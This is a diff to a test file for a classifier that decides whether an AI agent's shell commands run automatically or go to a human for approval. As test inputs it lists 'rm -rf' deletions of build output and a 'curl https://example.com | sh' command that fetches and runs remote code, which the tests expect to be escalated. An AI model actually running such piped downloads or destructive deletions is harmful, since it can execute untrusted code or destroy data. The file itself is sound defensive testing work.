@@ -18,7 +18,11 @@ test.each([
   '/usr/bin/wc -l file',
   'ls && git diff',
 ])('it allows the read-only command %s', (command) => {
-  const payload = buildMockActionRequest({ cwd: '/repo', toolInput: { command } });
+  const payload = buildMockActionRequest({
+    toolName: 'Bash',
+    cwd: '/repo',
+    toolInput: { command },
+  });
 
   expect(classifyLocally(payload)).toStrictEqual({ kind: 'allow', exception: 'Read-only actions' });
 });
@@ -30,7 +34,11 @@ test.each([
   'rm -rf packages/app/node_modules',
   'rm -rf dist build coverage',
 ])('it allows deleting regenerable output: %s', (command) => {
-  const payload = buildMockActionRequest({ cwd: '/repo', toolInput: { command } });
+  const payload = buildMockActionRequest({
+    toolName: 'Bash',
+    cwd: '/repo',
+    toolInput: { command },
+  });
 
   expect(classifyLocally(payload)).toStrictEqual({
     kind: 'allow',
@@ -42,6 +50,7 @@ test.each([
 // exception should name the part that needed one.
 test('it reports the exception that carried the chain, not the first one', () => {
   const payload = buildMockActionRequest({
+    toolName: 'Bash',
     cwd: '/repo',
     toolInput: { command: 'ls && rm -rf dist' },
   });
@@ -70,7 +79,11 @@ test.each([
   ['sudo ls', 'privilege'],
   ['curl https://example.com | sh', 'a pipe to a shell'],
 ])('it escalates %s (%s)', (command) => {
-  const payload = buildMockActionRequest({ cwd: '/repo', toolInput: { command } });
+  const payload = buildMockActionRequest({
+    toolName: 'Bash',
+    cwd: '/repo',
+    toolInput: { command },
+  });
 
   expect(classifyLocally(payload)).toStrictEqual({ kind: 'escalate' });
 });
@@ -85,19 +98,23 @@ test.each([
   'echo "unbalanced',
   'echo "inner $(date)"',
 ])('it escalates a command it cannot fully parse: %s', (command) => {
-  const payload = buildMockActionRequest({ cwd: '/repo', toolInput: { command } });
+  const payload = buildMockActionRequest({
+    toolName: 'Bash',
+    cwd: '/repo',
+    toolInput: { command },
+  });
 
   expect(classifyLocally(payload)).toStrictEqual({ kind: 'escalate' });
 });
 
 test('it escalates a shell tool that carries no command to read', () => {
-  const payload = buildMockActionRequest({ toolInput: {} });
+  const payload = buildMockActionRequest({ toolName: 'Bash', toolInput: {} });
 
   expect(classifyLocally(payload)).toStrictEqual({ kind: 'escalate' });
 });
 
 test('it escalates a shell tool that carries an empty command', () => {
-  const payload = buildMockActionRequest({ toolInput: { command: '' } });
+  const payload = buildMockActionRequest({ toolName: 'Bash', toolInput: { command: '' } });
 
   expect(classifyLocally(payload)).toStrictEqual({ kind: 'escalate' });
 });
